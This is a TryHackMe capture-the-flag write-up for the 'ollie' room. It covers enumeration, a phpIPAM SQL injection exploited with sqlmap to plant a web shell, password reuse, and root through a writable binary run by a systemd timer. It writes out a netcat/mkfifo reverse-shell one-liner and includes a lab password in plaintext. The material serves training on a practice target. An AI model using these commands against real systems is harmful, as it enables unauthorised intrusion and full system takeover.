# ollie TryHackMe writeup
### [ollie](https://tryhackme.com/room/ollie) is a room made by [0day](https://tryhackme.com/p/0day) rated Medium difficulty.
```
Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!
```



## __Enumeration__

### __nmap__
First I started off by running rustscan (nmap on steroids) on the target;
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Ollie :: login
|_Requested resource was http://10.10.232.7/index.php?page=login
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
1337/tcp open  waste?
```

### __port 1337__

This led me to the non-standard port, 1337.
when accessing this port via netcat, you can see a few questions.

Firstly, it asks for your name, I tried supplying a few format strings hoping to maybe find a Format String Vulnerability but it appears to be safe.
```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? 
```
After the name, it asks;
```
What's up, Ghop! It's been a while. What are you here for? 
```
I once again tried a format string which did not work (it doesn't even display my input).
After entering something in you get:
```
Ya' know what? Ghop. If you can answer a question about me, I might have something for you.
```

The last question seems to be the most interesting one, it asks;
```
What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? 
```
From knowing Ryan (and seeing all the doggo pictures) I know Ollie is a Bulldog, and so I enter bulldog.
This results in credentials and several usernames being shown!
```
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: -----------

PS: Good luck and next time bring some treats!
```
I added the usernames (Benny, Baxter, Connie) and the credentials to my notes.

### __port 22__

At this point I tried logging in to ssh hoping for an easy Initial Access but it failed, as you could only login with a Private Key.

### __port 80__

Entering the website prompts you to login, and considering the limited credentials we have, I logged in using the credentials found on port 1337.

We are met with a [PHPIPAM](https://phpipam.net/) 1.4.5 website, Because I have not heard / used this service in the past I googled it and found a few vulnerabilities, none of which matched our version, but, I remembered the room description, which clearly stated that there are legacy files on the website, The vulnerabilty I found was [CVE-2022-23046](https://www.exploit-db.com/exploits/50684) which seemed just perfect.

## __Initial Access__

I downloaded it, did everything I needed to run the exploit, but it failed. I didn't give up and tried exploiting the same vulnerabilty in a different way, `sqlmap`.
I used the following command to confirm the existence of the SQLi;
```
sqlmap -u 'http://10.10.232.7/app/admin/routing/edit-bgp-mapping-search.php' --data='subnet=aaa&bgp_id=1' --cookie="phpipam=<SESSIONID>"
```
This did infact confirm the existence of out SQLi, and I was thrilled, but here I got stumped, I tried everything I could think of to leverage this SQLi to a shell, but simply couldn't get it, and so I resorted to asking 0day for help, which he gave me gladly ~~In return for me making this write-up~~. The tip I got was simple, try writing a file, now I was a little suprised, since I already tried using `--os-shell` to get a file uploaded and get in from the website, but I just tried some more things, and I used the pure `--file-write` and `--file-dest`. problem is, I wasn't sure where the website is located on the system, and I didn't know how to get that information, so I did what every rational person would do, and dumped the entire database hoping for the path to be somewhere, and to my surprise, I found it!

I found the path in the performance_schema -> file_instances table, and I just then I realised, I fucked up. you see, I thought Ryan would complicate this, and have the website's root in an obscure non default location, but after all, it was in `/var/www/html`.

After this the entire thing is really quite simple, I just used `sqlmap` to upload a web-shell, and get shell!
One top, make sure you let `sqlmap` find several types of injections, because only a specific type will work.

## __Privilege Escalation__

### __www-data to ollie__
So we landed a shell as www-data, what now? This part is really easy but a little obscure, remember that password we used to login to admin on the PHPIPAM? I tried it as ollie's password, and we got it!
```
www-data@hackerdog:/$ whoami && id && hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hackerdog
www-data@hackerdog:/$ su ollie
Password: 
ollie@hackerdog:/$ whoami && id && hostname
ollie
uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
hackerdog
ollie@hackerdog:/$ 
```
## __ollie to root__
Here it gets serious, I absolutely loved this privesc!
```
ollie@hackerdog:/etc/systemd/system$ cat feedme.timer 
# 0day was here

[Unit]
Description=This is a timer to feed Ollie Boy!
Requires=feedme.service

[Timer]
Unit=feedme.service
OnCalendar=*-*-* *:*:00

[Install]
WantedBy=timers.target
ollie@hackerdog:/etc/systemd/system$ cat feedme.service 
# feedollie.service
# test
[Unit] 
Description= Feed Ollie
Documentation= Ollie is hungry!

[Service] 
Type= simple 
User= root

ExecStart= /usr/bin/feedme

[Install] 
WantedBy= multi-user.target
```
I personally have never seen timers used for privilege escalation, and I loved it, solving it was also very easy, The timer ran a service, that executed a file that we had write permissions to.

```
echo 'bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <our_ip> 1337 >/tmp/f"' >> /usr/bin/feedme
```
After executing this, we just wait, and boom!
```
root@hackerdog:~# whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root)
hackerdog
root@hackerdog:~# 
```

Now just get the flag from `/root/` and we are done!

## __Extras!__

But, I wasnted to see how that thing on port `1337` works, so let's check out the docker container running, we find the docker container id using `docker ps` and enter the container using `docker exec -it <container_id> sh`.

now I just used cat for the `olliebot.py` script, and looked at the source.
```python
import sys
import threading
import socket
from time import sleep

#make this run on startup  WIP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1337))
s.listen()

def catch(c, a):
    c.send(b"Hey stranger, I\'m Ollie, protector of panels, lover of deer antlers.\n\nWhat is your name? ")
    user = c.recv(1024).decode("utf-8").strip("\n")
    c.send(f'What\'s up, {user.capitalize()}! It\'s been a while. What are you here for? '.encode("utf-8"))
    what = c.recv(1024).decode("utf-8").strip("\n")
    if 'food' in what.lower():
        c.send(b'I am hungry, I need food. You better be careful. I\'ve been known to bite. Moving on...\n')
        sleep(1.5)
        c.send(b'Ya know what... I have an idea. A question to test your knowledge about me...\n')
        sleep(2)
    else:
        c.send(f'Ya\' know what? {user.capitalize()}. If you can answer a question about me, I might have something for you.\n'.encode("utf-8"))
        sleep(1.5)

    while True:
        c.send(f'\n\nWhat breed of dog am I? I\'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? '.encode("utf-8"))
        riddle = c.recv(1024).decode("utf-8").strip("\n")
        if 'bulldog' not in riddle.lower():
            c.send(b'You are wrong! I\'m sorry, but this is serious business. Let\'s try again...\n')
        else:
            c.send(b'You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...\nPlease hold on a minute\n')
            sleep(2)
            c.send(b'Ok, I\'m back.\nAfter a lengthy discussion, we\'ve come to the conclusion that you are the right person for the job.')
            sleep(2)
            c.send(b'''Here are the credentials for our administration panel.\n
                    Username: admin\n
                    Password: OllieUnixMontgomery!\n\n''')
            sleep(1)
            c.send(b'PS: Good luck and next time bring some treats!\n\n')
            break

    c.close()



if __name__ == "__main__":
    while True:
        try:
            c,a = s.accept()
            thread = threading.Thread(target=lambda: catch(c,a))
            thread.setDaemon(True)
            thread.start()
        except KeyboardInterrupt:
            s.close()
            exit()
        except Exception:
            continue
```
Against my expectations, there were no easter eggs / "backdoors", well, doesn't matter much, I hope you enjoyed and maybe learned something!


### __made by [GHoP](tryhackme.com/p/GHoP)__
